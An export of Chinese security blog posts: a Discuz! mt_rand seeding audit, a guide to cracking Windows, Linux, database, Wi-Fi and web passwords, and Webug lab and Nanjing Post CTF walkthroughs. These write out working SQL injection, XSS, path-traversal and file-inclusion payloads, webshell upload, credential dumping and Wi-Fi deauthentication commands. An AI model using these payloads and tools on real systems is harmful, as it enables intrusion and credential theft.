（Exp:[http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt]）* PHP版本要求:php4 php5&lt;5.2.6 系统要求: 无 审计策略:查找mt_srand/mt_rand 第一步 安装Discuz! 6.1后利用grep查找mt_srand得到： 123456789101112131415161718192021222324heige@heige-desktop:~/dz6/upload$ grep -in &apos;mt_srand&apos; -r ./ --colour -5./include/global.func.php-694- $GLOBALS[&apos;rewritecompatible&apos;] &amp;&amp; $name = rawurlencode($name);./include/global.func.php-695- return &apos;&lt;a href=&quot;tag-&apos;.$name.&apos;.html&quot;&apos;.stripslashes($extra).&apos;&gt;&apos;;./include/global.func.php-696-&#125;./include/global.func.php-697-./include/global.func.php-698-function random($length, $numeric = 0) &#123;./include/global.func.php:699: PHP_VERSION &lt; &apos;4.2.0&apos; &amp;&amp; mt_srand((double)microtime() * 1000000);./include/global.func.php-700- if($numeric) &#123;./include/global.func.php-701- $hash = sprintf(&apos;%0&apos;.$length.&apos;d&apos;, mt_rand(0, pow(10, $length) - 1));./include/global.func.php-702- &#125; else &#123;./include/global.func.php-703- $hash = &apos;&apos;;./include/global.func.php-704- $chars = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&apos;;--./include/discuzcode.func.php-30-./include/discuzcode.func.php-31-if(!isset($_DCACHE[&apos;bbcodes&apos;]) | !is_array($_DCACHE[&apos;bbcodes&apos;]) | !is_array($_DCACHE[&apos;smilies&apos;])) &#123;./include/discuzcode.func.php-32- @include DISCUZ_ROOT.&apos;./forumdata/cache/cache_bbcodes.php&apos;;./include/discuzcode.func.php-33-&#125;./include/discuzcode.func.php-34-./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);./include/discuzcode.func.php-36-./include/discuzcode.func.php-37-function attachtag($pid, $aid, &amp;$postlist) &#123;./include/discuzcode.func.php-38- global $attachrefcheck, $thumbstatus, $extcredits, $creditstrans, $ftp, $exthtml;./include/discuzcode.func.php-39- $attach = $postlist[$pid][&apos;attachments&apos;][$aid];./include/discuzcode.func.php-40- if($attach[&apos;attachimg&apos;]) &#123; 有两个文件用到了mt_srand()，第1是在./include/global.func.php的随机函数random()里： 1PHP_VERSION &lt; &apos;4.2.0&apos; &amp;&amp; mt_srand((double)microtime() * 1000000); 判断了版本，如果是PHP_VERSION &gt; ‘4.2.0’使用php本身默认的播种。从上一章里的分析我们可以看得出来，使用php本身默认的播种的分程序两种情况： 1) ‘Cross Application Attacks’ 这个思路是只要目标上有使用使用的程序里定义了类似mt_srand((double)microtime() * 1000000)的播种的话，又很有可能被暴力。在dz这里不需要Cross Application，因为他本身有文件就定义了，就是上面的第2个文件： 1./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000); 这里我们肯定dz是存在这个漏洞的，文章给出来的exp也就是基于这个的。（具体exp利用的流程有兴趣的可以自己分析下]） 2) 有的人认为如果没有mt_srand((double)microtime() * 1000000);这里的定义，那么dz就不存在漏洞，这个是不正确的。首先你不可以保证别人使用的其他应用程序没有定义，再次不利用’Cross Application Attacks’，5.2.6&gt;php&gt;4.2.0 php本身默认播种的算法也不是很强悍（分析详见上），也是有可以暴力出来，只是速度要慢一点。 后话本文是80vul的三大马甲：80vul-A，80vul-B，80vul-C集体智慧的结晶，尤其是80vul-B贡献了不少新发现。 另外需要感谢的是文章里提到的那些漏洞的发现者，没有他们的成果也就没有本文。 本文没有写“参考”，因为本文是一个总结性的文挡，有太多的连接需要提供限于篇幅就没有一一列举，有心的读者可以自行google。另外原本没有打算公布此文，因为里面包含了太多应用程序的0day，而且有太多的不尊重别人成果的人，老是利用从别人那学到的技术来炫耀，甚至牟取利益。在这里我们希望你可以在本文里学到些东西，更加希望如果通过本文你找到了某些应用程序的0day，请低调处理，或者直接提交给官方修补，谢谢大家！！ 附录[1] (http://bbs.phpchina.com/attachment.php?aid=22294)[2] ([http://www.php-security.org/)[3] (http://bugs.php.net/bug.php?id=40114)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[密码破解系列]]></title>
      <url>%2F2017%2F10%2F28%2F%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E7%B3%BB%E5%88%97%2F</url>
      <content type="text"><![CDATA[前言本文总结了有关Windows密码、Linux密码、网络设备密码、数据库密码、无线网络密码、web应用登陆密码的破解以及在线扫描服务的密码破解。 正文####1.windows密码破解 获取密码（抓取HASH）：pwdump、wce、mimikatz 破解密码：hashcat、LC5、SAMInside.exe、Ophcrack、mimikatz、hashsuite 密码抓取： 环境：windows7 前提：已经获取root权限 工具：mimikatz 操作： 原理是从lsass.exe进程中直接获取密码信息进行破解，而且该破解应该并非穷举方式，而是直接根据算法进行反向计算。 密码提取： 原因：为了进行口令破解，必须首先运行一个工具，将Windows口令从SAM文件中提取出来，做这一步工作的原因在于Windows运行过程中SAM被锁定，不能直接复制或编辑这个文件(即使有管理员权限也不行)。 环境：windows10（提取hash）、Windows7（破解hash） 工具：Pwdump7，wce（Windows Credentials Editor） 操作： 用管理员权限打开Pwdump7，从而获得Windows口令 用管理员权限打开wce，从而获得Windows的NTML HASH 还可以利用wce直接获取Windows的密码（-w参数是通过摘要式认证缓存一个明文的密码）： 密码破解： 环境：Windows10（CPU：i5；GPU：gtx860） 工具：hashcat、hashsuite 操作： 1.使用hashcat进行密码的破解 hashcat参数简介： -m 这个是指定破解的hash的类型，具体的类型可以在–help参数中看到。 默认是0也就是MD5，而NTLM则是1000。 -a 指定破解的模式，默认是字典模式 -o 输出文件，破解成功的密码存放的文件 –remove移除破解成功的hash，当hash是从文本中读取时有用，避免自 己手工移除已经破解的hash –username 忽略用户名，如果你的hash文件中是username:hash这种格式只 需要指定这个参数，就不需要再手工编辑了 -r 指定规则文件，字典根据规则文件做变形，用于破解相似密码当-a指定为3 时，就是暴力破解模式，这个模式下需要自己指定mask和长度。 Hashcat-plus中以?l表示小写字母，?d表示数字，?u表示大写字母，?s表示所有可打印符号，?a代表所有可打印字符，它等于?l?u?d?s加在一起。 2.使用SAMInside.exe进行密码破解 环境：Windows10 1）使用管理员身份运行SAMInside.exe 2）你可以选择使用Pwdump7获取口令之后将其导入SAMInside.exe进行破解；或者使用SAMInside.exe来直接获取本地口令进行破解（本例使用第二种方式，点击三个小人的图标然后选择import local users via scheduler将本地用户的hash导出来）。 3）选择用户加载字典来进行爆破，最终可以看到已经破解了口令 注：由于我之前载入字典破解了本地密码所以在每次导入时均会显示已经破解了密码 3.使用hashsuite可以直接进行windows的NTML HASH的抓取与破解。但是前提依旧是在管理员权限下进行 环境：windows10 1）首先以管理员身份运行hashsuite 2）导入要破解的口令，在这里我们选择导入本地的口令（选择后软件会自动将口令进行提取） 3）之后我们选择使用字典破解的方式对账户Assassin001的口令进行破解 ####2.Linux密码破解 知识概要： ▶ head -n 2 /etc/passwd root;x:0:0:root:/root:/usr/bin/zsh daemon:x;1:1:daemon:/usr/sbin:/usr/sbin/nologin 以”:”分隔，共有七个字段： 1.账号名称；2.密码（Linux早期密码存放地，现在均存在/etc/shadow中）；3.UID（用户标识符）；4.GID；5.用户信息说明列；6.主文件夹；7.shell ▶ head -n 2 /etc/shadow root:$6$XrLBeXo2$iYJYakUC6eBvRl40PnFKlemX7IjI7QkFu7f3qTZjIr.RBy3dp3YT3QWkDYxmKBmmzQO8FUXXbK72lnaz.GeSB0:17304:0:99999:7::: daemon:*:17043:0:99999:7::: 以”:”分隔，共有九个字段： 1.账号名称；2.密码；3.最近更新密码的日期；4.密码不可被更动的天数；5.密码需要重新更改的天数；6.密码需要更改期限前的警告天数；7.密码过期后的账号宽限时间；8.账号失效日期；9.保留 密码抓取： 环境：kali linux 前提：已经获取root权限(可以使用dirtycow.c等0day进行Linux的提权操作) 工具：mimipenguin(Linux下的mimikatz) 操作： 密码破解： 环境：kali linux 前提：已经获取root权限(可以使用dirtycow.c等0day进行Linux的提权操作) 工具：John the ripper 操作： 1.使用unshadow命令创建1个含有用户名和密码详细信息的文件 2.使用John来破解 ####3.网络设备密码破解 环境：windows7 工具：Cain 操作： 破解Cisco中Password 7加密，密文为052C3C5F70420F1A0E 环境：kali linux 工具：John the ripper 操作： 1.将密文整理成cisco: $1$sqzM$q8vBgOd3KunqZw/D1Nq211，保存在文件中然后使用john进行破解 ####4.数据库密码破解 环境：windows10 MSSQL数据库 工具：Cain 操作： 1.添加Hash到队列 2.开始暴力破解 环境：windows10 MYSQL数据库 工具：Cain 操作： 1.执行SELECT password,USER() FROM mysql.user;来获取密文 2.将MYSQL的密文导入Cain 3.使用字典攻击模式进行攻击 环境：windows10 Oracle数据库 工具：Cain 操作： 1.导入Oracle数据库账号密码 2.进行暴力破解 ####5.无线密码破解 环境：kali linux 、WPA/WPA2 PSK加密 无线路由器 TP-LINK_4D16、Windows10（hashcat进行GPU运算） 工具：外置USB无线网卡 操作： 把网卡切换为监听模式 1sudo airmon-ng start wlan0 2.监听网络流量信息 1sudo airodump-ng -w file wlan0mon 使用mdk3， 强制断线路由的所有链接， 此次操作是为了能让aircrack抓到wifi的握手信息 ， -c为需要强制断线的信道： 1mdk3 wlan0mon d -c 11 过了几分钟， 可以看到， 用户重新连接上了901路由， 我们也捕获到了handshake信息， 上面airodump-ng的命令窗口顶部出现了以下信息 WPA handshake ，此时直接ctrl＋c ，停止捕获信息 在kali的Home目录下生成了了几个文件 ，此时的file-01.cap为最重要的文件： 4.把文件转换为hccapx格式， 我们打开这个网站：https://hashcat.net/cap2hccapx/ ， 然后选择cap文件并点击covert按钮， 并下载一个hccapx格式的文件 5.网页会返回一个hccapx的文件， 使用hashcat命令破解， 参数dict.txt为生成的字典文件 ， -m参数2500代表破解的方式为WPA/WPA2， 999.hccapx为生成的文件， 最后破解出来的密码为whitehat： PS E:\MYSEC\hashcat-3.6.0&gt; .\hashcat64.exe -m 2500 999.hccapx dict.txt ####6.web应用破解 环境：Windows10（phpstudy搭建漏洞靶场DVWA的爆破模块） 工具：burpsuite 操作： 1.使用burpsuite抓取登录时候的数据包 2.将数据包发送至Intruder模块并对攻击点进行标注 3.载入攻击字典并进行暴力破解 4.暴力破解后效果 5.验证破解密码是否正确（一般观察Length和Status来判断正确的密码） 6.如果密码不正确的页面截图 环境：Windows7 工具：AWVS 10.5版本 操作： 1.设置浏览器代理访问登录界面使用burpsuite抓取登录请求包 2.在AWVS扫描器中的HTTP Fuzzer模块填入刚抓的登录过程的HTTP数据包 3.在Generator中可以看到很多方式,可以使用AWVS自带的生成器,也可以选择File Generator来使用自己生成的字典.还可以设定是否编码.最后在需要穷举的地方指定变量,对应的是你Generator的name属性.图中的蓝色字体部分. 4.点击start，观察响应体可以看出爆破成功密码为password ####7.在线扫描破解hydra 环境：Windows10（FileZilla Server搭建的ftp服务器）、kali linux（预装了hydra） 测试用户：test：123456 操作： 1）启动ftp服务，启动成功后可以使用我添加的测试账户登录ftp读取我电脑E盘的文件 2）使用hydra来进行爆破 命令为： hydra -L ./user.txt -P ./pass.txt -t 20 -vV -e ns 192.168.169.1 ftp -l LOGIN 小写，用于指定破解的用户，对特定用户破解 -L FILE 大写，用于指定用户的用户名字典 -p PASS 小写，用于指定密码破解，少用，一般是采用密码字典 -P FILE 大写，用于指定密码字典 -vV为显示详细的爆破过程 -e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探 最后加上目标ip以及需要进行爆破的协议即可 3）显示成功后进行登录验证，发现可以成功登录]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Webug渗透基础教程]]></title>
      <url>%2F2017%2F10%2F24%2FWebug%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%2F</url>
      <content type="text"><![CDATA[####普通的GET注入 解法一：使用sqlmap 1）sqlmap -u”http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1“ -b –current-db –current-user 可以看到当前的数据库名称以及用户名称 2）sqlmap -u”http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1“ -D pentesterlab –tables 可以看到pentesterlab中有那些数据表 3）sqlmap -u”http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1“ -D pentesterlab -T flag –columns 显示出该表下的所有列 4）sqlmap -u”http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1“ -D pentesterlab -T flag -C flag –dump 得到flag:204f704fbbcf6acf398ffee11989b377 解法二：手工进行注入 1）先通过order by 子句判断有几个字段。 http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1’ order by 1 –+ 当order by 后加数字为5的时候报错因而判断有4个表 2）爆数据库 http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1‘ UNION SELECT 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() –+ 3）爆表名 http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1‘ UNION SELECT 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 –+ 4）爆列名 http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1‘ UNION SELECT 1,2,3,group_concat(id,0x5e,flag) from flag –+ 参考： http://www.freebuf.com/articles/web/29942.html http://www.cnblogs.com/zlgxzswjy/p/6707433.html ####从图片中你能找到什么？ 1）首先从网站下载这个图片，之后你可以选择用winhex（windows平台使用）分析或者使用binwalk（linux平台）来分析，这里使用binwalk 2）先看看文件的构成，可以看到是有一个rar格式的文件在里面的 3）分离文件（当然你把文件后缀修改为rar也是可以的） 4）直接看123.txt的内容是：密码是123。之后post这个密码就好 他题没有出好，咱们的思路是没有问题的。 ####你看到了什么？ 1）题目不明确的时候就看源码，源码注释部分有扫目录的提示 2）使用工具扫描目录 其实这里存在一个小技巧，如果对方没有设置好apache的话会出现列目录的情况，这往往会泄露信息 3）看一眼诡异的test 4）然后就解答了 ####告诉你了FLANG是5位数 1）分析：先看源码无提示；再考虑注册等功能发现无解；最后考虑爆破 2）爆破无验证码所以使用burpsuite（此处示例使用）或者AWVS等工具均可，若有验证码则要考虑自己编写脚本。最后可以发现爆破结果为admin：admin123 3）登录发现没有flag（其实也是题目的问题，我们阅读源码即可发现） ####一个优点小小的特殊的注入 1）提示头注入，所以直接使用sqlmap进行注入，首先burp抓包然后保存在sqlmap中 2）分析：头注入可能出现的几个位置：X-Forwarded-For、User-agent、Referer、Cookie。此处没有出现X-Forwarded-For所以我将其加上先进行这个点的测试。运气不错直接报错。接下来进行注入，与第一题的手工注入过程类似进行注入即可，或者使用sqlmap进行注入（注入命令为：python .\sqlmap.py -r .\test.txt -p “X-Forwarded-For” text.txt文件的内容为你抓的包）。 最后成功注入得到flag 注释：其实你手里是有源代码的，源码看下从白盒角度分析你就可以得到tips在哪儿。这里是基础代码审计不过多解释(代码审计可以借助一些工具的比如我最喜欢的cobra)。 一下是使用cobra检测的结果： ####这关需要RMB购买哦 1）点开可以看到只有一个登陆框，查看源代码看是否有tips, 果真是有提示的： 2）跟着提示走，猜测是否可能为注入，但是当我访问链接 1http://172.16.188.129/pentest/test/2/index.php?url=123 却出现了弹出并显示成功跳转，没啥用，还是看下账号密码吧，第一题注入也可以看到这个账号密码。 3）账号：密码&gt;&gt;&gt;tom:123456登陆抓包可以控制金额进行买卖 ####越权 1）让修改密码所以目标就很明确了，我要越权修改别人的密码 8.csrf 题目已经提示了是csrf所以我门使用burpsuite抓包然后直接生成PoC即可。 我们可以来测试一下效果： 首先我们访问我们的PoC 之后点击submit便可以看到提示修改密码成功： ####URL跳转 看到题目的提示我突然想到前面在源码中看到的一个提示： 1&lt;a href=&quot;index.php?url=#&quot;&gt;I&lt;/a&gt; 从这里顿时想到了跳转的原理，所以我们只需要这样做就可以访问百度了： 1172.16.188.129/pentest/test/5/index.php?url=https://www.baidu.com/ ####文件下载 直接访问发现是404，感觉有问题，还以为是要扫描发现某些文件，但发现不是，便去服务器看了下题目源码： 可以看到这个index.php是有问题的，所以我们直接看download.php即可 觉得没有方向的话还是先看源码或者抓包看有没有提示，很巧在源码中我们可以看到有个tips：帮管理员找回mysql帐号密码。通过文件下载找管理员密码，那么可以判断此处应该是任意文件下载漏洞。而要找到管理员的密码我们肯定是要先下载数据库配置文件之后看情况来判断是否需要下载数据库文件。通过之前那个题我们知道这个靶场的apache没有配置好导致文件路径泄漏的问题。所以我们来手动翻一翻。 发现data这个路径下什么都没有，所以是不是可能存在一个跟data同级的目录（其实刚才看源码我都看到了） 成功发现config.php，之后我们构造PoC进行下载： 1http://172.16.188.129/pentest//test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php 之后打开就可以找到密码了，并不需要进一步对数据库做什么。 ####我和上题有点像 这个和上面几乎一样，只不过参数的提交方式变了而已，我们用burp抓包然后修改pic参数即可。 ####我系统密码忘记了 1）使用账号密码：tom；123456进行登录，登录后发现可以上传文件，所以便尝试上传webshell 2）发现没有任何过滤，所以之后使用cknife进行连接 3）上传mimikatz抓取管理员密码即可 ####xss 无任何过滤的一个反射型xss 1http://172.16.188.129/pentest/test/9/?id=%3Cscript%3Ealert(%27npusec%27)%3C/script%3E ####存储型xss 也是不存在任何的过滤，只需要在留言处填写： 1&lt;script&gt;alert(/npusec/)&lt;/script&gt; ####什么？图片上传不了？ 1）上传一张图片 2）上传php脚本 3）不能是图片还不能是脚本，我们看下处理的逻辑： 123456789101112131415161718if(strstr($_FILES["file"]["type"],"image")&amp;&amp;strstr($_FILES["file"]["name"],"php"))&#123; if (file_exists("upload/" . $_FILES["file"]["name"])) &#123; echo $_FILES["file"]["name"] . " already exists. "; &#125; else &#123; move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]); echo "Stored in: " . "upload/" . $_FILES["file"]["name"]; &#125;&#125;else if(strstr($_FILES["file"]["name"],"png")||strstr($_FILES["file"]["name"],"jpg")||strstr($_FILES["file"]["name"],"jpeg")||strstr($_FILES["file"]["name"],"bmp")||strstr($_FILES["file"]["name"],"gif"))&#123; echo "&lt;font color='red'&gt;你真的上传了图片,可是这张图片我不喜欢,能换张吗?&lt;/font&gt;";&#125;else&#123; echo "&lt;font color='blue'&gt;你居然不上传图片,宝宝怒了!!&lt;/font&gt;";&#125;echo "&lt;hr/&gt;"; 4）根据代码来判断文件的type要为image、其次文件name要有php： ####明天双十一 源码如下： 1234567891011121314151617if(strstr($url,"www.taobao.com"))&#123; if($_SERVER['HTTP_HOST']=="10.10.10.10")&#123; if(strstr($_SERVER['HTTP_REFERER'],"www.baidu.com"))&#123; if(strstr($_SERVER['HTTP_REFERER'],"www.baidu.com"))&#123; echo "剁手了，请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0"."&lt;br/&gt;"; &#125;else&#123; echo "不想剁手了"."&lt;br/&gt;"; &#125; &#125;else&#123; echo "nono"."&lt;br/&gt;"; &#125; &#125;else&#123; echo "哎呀，这里只允许10.10.10.10访问！！！"."&lt;br/&gt;"; &#125; &#125;else&#123; echo "这个地方剁手不好，换个地方！"; &#125; 一目了然，只需要将几个关键地方设置正确即可：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[南京邮电CTF题解]]></title>
      <url>%2F2017%2F10%2F24%2F%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5CTF%E9%A2%98%E8%A7%A3%2F</url>
      <content type="text"><![CDATA[源码分析nctf{flag_admiaanaaaaaaaaaaa} php的弱类型加MD5碰撞首先考察post提交数据，然后考察md5碰撞，MD5加密QNKCDZ0可以看到是0exxxxxxxxx之类的字符，你只需要找到一个字符串，md5加密后是0e开头就好了。例如： aabg7XSs flag nctf{md5_collision_is_easy} 绕过长度限制考察html中的一些知识，在此直接用开发者工具修改即可 nctf{follow_me_to_exploit} 基本图片隐写术macos下类似winhex的软件有http://ridiculousfish.com/hexfiend/ nctf{photo_can_also_hid3_msg} 源码分析进阶访问连接，没看出端倪，直接用burpsuite的spider模块爬了一下，结果发现404.html，访问之后查看源代码，进而发现端倪。 nctf{this_is_a_fl4g} js的AAencode其实已经提示是AAencode了，想办法解密就行。比如你可以再http://tool.isex.ren/aadecode这个网站进行解密。机密结果就是flag（有人说浏览器打开是乱码，这样的话你wget下载，然后记事本打开就行） alert(“nctf{javascript_aaencode}”) 单身拼手速我觉得是题目没有出好，我直接在burpsuite中抓包就看到了flag 当然也可能是出好了，考察的就是跳转 nctf{yougotit_script_now} 你从哪里来一看就知道是改referer，因为在http头中来源地就是这个参数，在hackbar中修改了就行。 nctf{http_referer} php decode1&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE;&#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt; 修改为如下代码，运行即可： 123456789101112131415&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE;&#125;echo(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt; 其实我觉得这个不是在考代码审计，因为你echo一下就有flag了。但是还是说下这个解密。具体参考这个文章https://www.waitalone.cn/eval-gzinflate-base64_decode-decryption.html 文件包含参考如下文章，构造http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php http://www.2cto.com/article/201311/258420.html 实在不会我们还有工具：https://github.com/D35m0nd142/LFISuite 单身一百年也没用考察302跳转：http://blog.sina.com.cn/s/blog_4550f3ca0101czu9.html 做题用burp抓包放repeater就行，其实用curl也可以 例如我用curl命令来做一下，其实这个源码也很好猜的 12345678910111213141516171819➜ ~ curl -i http://chinalover.sinaapp.com/web9/index.phpHTTP/1.1 302 FoundServer: saeDate: Mon, 11 Sep 2017 08:29:53 GMTContent-Type: text/htmlContent-Length: 0Connection: keep-aliveflag: nctf&#123;this_is302redirect&#125;Location: http://chinalover.sinaapp.com/web8/no_key_is_here_forever.phpVia: 1566 Download~!提示了文件下载，可以联想到任意文件下载漏洞，这样的话我们可以顺利的下载网站的源码进行审计的。我们先下载download.php（文件名是base64编码的），之后我们可以看到还有一个hereiskey.php，继续下载即可得到flag:nctf{download_any_file_666} download.php的源码如下： 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phperror_reporting(0);include(&quot;hereiskey.php&quot;);$url=base64decode($GET[url]);if( $url==&quot;hereiskey.php&quot; || $url==&quot;buxiangzhangda.mp3&quot; || $url==&quot;xingxingdiandeng.mp3&quot; || $url==&quot;download.php&quot;)&#123; $file_size = filesize($url); header ( &quot;Pragma: public&quot; ); header ( &quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot; ); header ( &quot;Cache-Control: private&quot;, false ); header ( &quot;Content-Transfer-Encoding: binary&quot; ); header ( &quot;Content-Type:audio/mpeg MP3&quot;); header ( &quot;Content-Length: &quot; . $file_size); header ( &quot;Content-Disposition: attachment; filename=&quot;.$url); echo(file_get_contents($url)); exit;&#125;else &#123; echo &quot;Access Forbidden!&quot;;&#125;?&gt; COOKIE看到提示0==not，果断抓包把0改成1，然后就有了flag flag:nctf{cookie_is_different_from_session} MYSQL提示让看robots.txt 然后看到源码 1&lt;?phpif($GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;)); if ($_GET[id]==1024) &#123; echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 其实在此处是考察mysql中的一个精度问题，比如2014.1虽然在php中哦按段不等于2014，但是再查询时，加入mysql设置id为整型，那么2014.1就会变成2014。 the flag is:nctf{query_in_mysql} sql injection 3其实看到连接就知道是gbk的问题了，后面提示也有 your sql:select id,title from news where id = ‘2’ gbk_sql_injection 关于宽字节注入问题可以看这个文章： http://www.91ri.org/8611.html https://www.2cto.com/article/201301/182881.html 你可以手动来做： 1http://chinalover.sinaapp.com/SQL-GBK/index.php?id=ß&apos; union select 1,database() # your sql:select id,title from news where id = ‘運’ union select 1,database() #’ sae-chinalover 1http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 your sql:select id,title from news where id = ‘id=運’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #’ ctf,ctf2,ctf3,ctf4,news 1http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 %23 your sql:select id,title from news where id = ‘運’ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634 #’ id,flag 1http://chinalover.sinaapp.com/SQL-GBK/index.php?id=%df&apos; union select 1,group_concat(id,0x3a,flag) from ctf4 %23 your sql:select id,title from news where id = ‘運’ union select 1,group_concat(id,0x3a,flag) from ctf4 #’ 1:nctf{gbk_3sqli} /x00看标题就知道这个是在考察00截断 分析下这段代码 1if (isset ($GET[&apos;nctf&apos;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $GET[&apos;nctf&apos;]) === FALSE) echo &apos;必须输入数字才行&apos;; else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE) die(&apos;Flag: &apos;.$flag); else echo &apos;骚年，继续努力吧啊~&apos;; &#125; ereg(mode, string subject, array regs); mode：正则表达式（preg_match中的mode必须以’/‘开始和“/”结束） subject： 需要验证的字符串 matchs/regs： 匹配后得到的结果。以数组的形式存储 strpos() 函数查找字符串在另一字符串中第一次出现的位置。 构造： http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=2%00%23biubiubiu 网上也有说构造 http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[]= 这个原因是因为报错并返回null（多亏了wonderkun大佬） bypass again这个题跟上面那个是不一样的，注意是=== 所以姿势如下：http://www.cnblogs.com/weidiao/p/6821812.html http://chinalover.sinaapp.com/web17/index.php?a[]=a&amp;&amp;b[]=c 变量覆盖看下代码 1234567891011121314151617&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php &#125; ?&gt;&lt;?php &#125; ?&gt; extract()出现的问题，详情见： http://www.cnblogs.com/sqyysec/p/6926095.html 构造： pass=1&amp;thepassword_123=1 post方式提交就行（使用hackbar和burp均可） PHP是世界上最好的语言http://way.nuptzj.cn/php/index.txt看到源代码 12345678910111213&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;)&#123; echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;&#125;?&gt; id的内容要跟hackerDJ不相同，但是urldecode之后要和hackerDJ相同 其实在此处考察的是$_GET[]本身就有urldecode的功能，所以构造：%2568ackerDJ即可 nctf{php_is_best_language} 伪装者看到这句“管理系统只能在本地登陆”就知道了 抓包增加：X-Forwarded-For: 127.0.0.1 nctf{happy_http_headers} Headerflag在响应头中，用burp看下就行 nctf{tips_often_hide_here} 上传绕过这题网上大多都写错了，有必要一写。 首先我们上传1.png（但实际文件内容写的是php一句话） 上传成功，我们可以知道与文件内容无关。重要的是：最终路径是拼接了 dir 和 filename 的，那么我们在 dir 处 00 截断为 .php 即可绕过。 具体的方式为用burp在hex中将空格20修改为00 nctf{welcome_to_hacks_world} SQL注入1知道了是post注入之后我们看代码就好 123456789101112131415161718&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;; echo &apos;&lt;/br&gt;&apos;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==&quot;admin&quot;) &#123; echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;; &#125; if($query[user] != &quot;admin&quot;) &#123; echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;); &#125;&#125;echo $query[user];?&gt; trim()是去除两侧空格，重点在于依据下面这句进行构造 $sql=”select user from ctf where (user=’”.$user.”‘) and (pw=’”.$pass.”‘)”; 构造：admin’)#即可， ‘)用来分别用来闭合 #用来把后面给注释掉 nctf{ni_ye_hui_sql?} pass check来继续审计： 1234567891011121314&lt;?php$pass=@$_POST[&apos;pass&apos;];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo &quot;flag:nctf&#123;*&#125;&quot;;&#125;else&#123;echo &quot;the pass is wrong!&quot;;&#125;&#125;else&#123;echo 